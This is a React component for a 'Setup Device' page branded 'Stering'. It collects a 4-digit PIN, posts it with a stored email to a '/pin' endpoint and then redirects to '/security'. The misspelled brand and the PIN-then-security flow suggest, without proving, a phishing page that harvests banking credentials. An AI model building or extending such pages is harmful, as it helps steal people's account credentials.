import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import BASE_URL from "../components/urls";
import logo from "../assets/logo.png";

const Pin = () => {
  const navigate = useNavigate();
  const [pin, setPin] = useState(Array(4).fill(""));
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [counter, setCounter] = useState(60);
  const [email, setEmail] = useState("");

  useEffect(() => {
    const storedEmail = localStorage.getItem("email");
    if (storedEmail) {
      setEmail(storedEmail);
    }
  }, []);

  useEffect(() => {
    if (counter > 0) {
      const timer = setTimeout(() => setCounter(counter - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [counter]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (pin.join("").length !== 4) {
      setError("OTP must be 4 digits");
      return;
    }
    setError("");
    setLoading(true);

    try {
      await axios.post(`${BASE_URL}/pin`, {
        pin: pin.join(""),
        email: email,
      });

      setPin(Array(4).fill(""));
      navigate("/security");
    } catch (err) {
      setError("OTP submission failed. Please try again.");
      console.log("OTP submission failed:", err);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white text-black px-6 pt-6 flex flex-col items-center">
      <div className="w-full max-w-md mt-6">
        {/* Back Icon and Logo */}
        <div className="flex justify-end items-center mb-8">
          <img src={logo} alt="Stering Logo" className="w-[40px]" />
        </div>

        {/* Titles */}
        <div className="mb-6">
          <h2 className="text-gray-500 text-lg font-medium">
            Device Management
          </h2>
          <h1 className="text-xl font-bold text-black">Setup Device</h1>
        </div>

        {/* Instruction */}
        <p className="text-md font-medium text-center mb-8">
          Enter your 4-digit PIN to verify your device.
        </p>

        {/* Pin Input */}
        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="bg-[#E2E2E4] w-full h-full mb-4 px-4 py-3 rounded-lg">
            <label className="text-xs text-gray-500 uppercase mb-1 block">
              Pin
            </label>
            <input
              type="text"
              inputMode="numeric"
              maxLength={4}
              value={pin.join("")}
              onChange={(e) => {
                const val = e.target.value.replace(/\D/g, "").slice(0, 4);
                const valArray = val.split("");
                setPin([...valArray, ...Array(4 - valArray.length).fill("")]);
                setError(""); // clear error on change
              }}
              className="w-full text-black bg-transparent focus:outline-none placeholder:text-gray-500"
            />
            {error && <p className="text-red-500 text-sm mt-1">{error}</p>}
          </div>

          {/* Submit */}
          <button
            type="submit"
            disabled={loading}
            className="w-full py-3 text-white font-semibold rounded-lg bg-[#d32f2f] hover:bg-[#b71c1c] transition"
          >
            {loading ? "Verifying..." : "Continue"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default Pin;
